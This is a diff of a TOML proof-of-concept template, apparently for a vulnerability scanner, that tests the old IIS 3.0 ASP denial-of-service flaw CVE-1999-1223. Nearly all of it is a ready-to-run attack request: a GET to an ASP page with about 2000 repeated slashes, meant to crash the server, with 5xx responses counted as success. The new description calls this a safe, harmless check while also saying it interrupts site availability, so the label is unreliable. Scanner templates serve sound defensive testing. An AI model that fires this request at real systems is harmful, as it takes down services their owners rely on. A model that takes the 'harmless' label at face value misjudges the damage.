@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Microsoft IIS 3.0 ASP 拒绝服务漏洞 PoC：向 IIS 3.0 服务器发送包含大量连续斜杠（/）字符的 URL 请求至 ASP 页面，触发 IIS 解析器缓冲区耗尽导致服务进程崩溃。"
+description = "IIS 3.0 在处理包含大量连续正斜杠(/)字符的特制 ASP 请求时存在拒绝服务漏洞。本 PoC 通过向目标 ASP 页面发送一个 URL 路径中嵌入大量斜杠的请求，验证服务器是否因解析异常或资源耗尽而失去响应。无需认证，仅能造成目标站点可用性中断，属安全无损验证。"
 id = "POC-AVE-1999-1012"
-name = "CVE-1999-1223 PoC"
+name = "CVE-1999-1223 (IIS 3.0 DoS) PoC"
 severity = "medium"
 tags = ["ave-1999-1012"]
 vuln_id = [
@@ -11,12 +11,15 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/AAAA/default.asp"
+path = '/{{BaseURL}}/test.asp//////{{repeat("/", 2000)}}'
 protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
@@ -24,14 +27,6 @@ status = [
     500,
     502,
     503,
+    504,
 ]
 type = "status"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "Server Error",
-    "Requested URL is too long",
-]
